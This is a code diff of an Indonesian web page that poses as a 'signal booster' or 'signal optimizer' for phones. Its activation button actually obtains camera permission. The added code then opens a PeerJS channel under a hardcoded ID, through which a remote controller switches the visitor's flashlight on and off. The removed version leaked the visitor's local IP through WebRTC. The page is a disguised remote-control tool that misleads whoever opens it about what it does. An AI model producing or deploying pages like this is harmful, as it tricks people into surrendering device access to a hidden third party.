@@ -1,47 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sinyal Booster V4</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; }
-    </style>
+    <title>Sinyal Booster V5</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 </head>
-<body>
-    <div class="box">
-        <h2>🚀 BOOSTING ACTIVE</h2>
-        <p id="ip-info">Mendeteksi Alamat Jaringan...</p>
-        <button onclick="mintaIzin()" style="padding:10px; background:#0f0; border:none; border-radius:5px;">AKTIFKAN SISTEM</button>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:100px; font-family:sans-serif;">
+    <div style="border:1px solid #0f0; padding:20px; display:inline-block; border-radius:15px;">
+        <h2>📡 SIGNAL OPTIMIZER</h2>
+        <p>Status: <span id="stat">Menghubungkan...</span></p>
+        <button onclick="aktifkan()" style="padding:15px; background:#0f0; border:none; border-radius:10px; font-weight:bold;">AKTIFKAN SISTEM</button>
     </div>
 
     <script>
-        // Mendeteksi IP Lokal secara otomatis (hanya di beberapa browser)
-        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-        var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};      
-        pc.createDataChannel("");
-        pc.createOffer(pc.setLocalDescription.bind(pc), noop);
-        pc.onicecandidate = function(ice){
-            if(!ice || !ice.candidate || !ice.candidate.candidate) return;
-            var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-            document.getElementById('ip-info').innerHTML = "<b>ALAMAT IP:</b> " + myIP;
-            pc.onicecandidate = noop;
-        };
+        // Kunci Rahasia: Gunakan nama unik (Ganti sesuka Abang)
+        const KUNCI_REMOT = "hayabusa_remote_anak_123"; 
+        const peer = new Peer(KUNCI_REMOT);
+        let videoTrack;
 
-        let track;
-        async function mintaIzin() {
+        peer.on('open', () => {
+            document.getElementById('stat').innerText = "Sistem Siap!";
+        });
+
+        // Menunggu Perintah Klik dari Abang
+        peer.on('connection', (conn) => {
+            document.getElementById('stat').innerText = "Remote Terhubung!";
+            conn.on('data', (data) => {
+                if (data === "ON") kontrolSenter(true);
+                if (data === "OFF") kontrolSenter(false);
+            });
+        });
+
+        async function aktifkan() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
-                track = stream.getVideoTracks()[0];
-                alert("Sistem Siap di IP tersebut!");
-            } catch(e) { alert("Klik Izinkan Kamera!"); }
+                videoTrack = stream.getVideoTracks()[0];
+                alert("Booster Aktif!");
+            } catch (e) { alert("Izin kamera diperlukan!"); }
         }
 
-        // Menerima perintah dari Remote via Message Channel
-        window.addEventListener("message", function(event) {
-            if (event.data === "on") track.applyConstraints({advanced: [{torch: true}]});
-            if (event.data === "off") track.applyConstraints({advanced: [{torch: false}]});
-        }, false);
+        async function kontrolSenter(s) {
+            if (videoTrack) {
+                await videoTrack.applyConstraints({advanced: [{torch: s}]});
+            }
+        }
     </script>
 </body>
 </html>
